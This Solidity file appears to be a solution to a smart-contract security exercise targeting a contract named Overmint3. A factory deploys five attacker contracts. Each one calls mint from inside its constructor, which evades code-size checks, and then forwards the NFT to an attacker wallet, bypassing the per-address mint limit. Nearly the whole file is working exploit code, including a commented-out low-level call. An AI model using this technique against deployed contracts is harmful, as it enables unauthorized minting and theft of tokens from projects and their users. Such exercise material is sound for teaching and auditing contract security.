//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";
import "../Overmint3.sol";

contract Overmint3Attacker {
    constructor(Overmint3 victim, address attackerWallet, uint256 tokenId) {
        console.log("overmint3Attacker constructor entered");
        //TODO: why low level doesn't work
        // bytes memory data = abi.encodeWithSignature("mint");
        // (bool success,) = address(victim).call{gas: 1_000_000}(data);

        victim.mint();
        victim.safeTransferFrom(address(this), attackerWallet, tokenId, "");
    }
}

contract Overmint3AttackerFactory {
    constructor(address attackerWallet, address victimContract) {
        console.log("Overmint3AttackerFactory constructor entered");
        Overmint3 victim = Overmint3(victimContract);
        for (uint256 i = 1; i < 6; i++) {
            Overmint3Attacker attacker = new Overmint3Attacker(victim,attackerWallet,i);
        }
    }
}
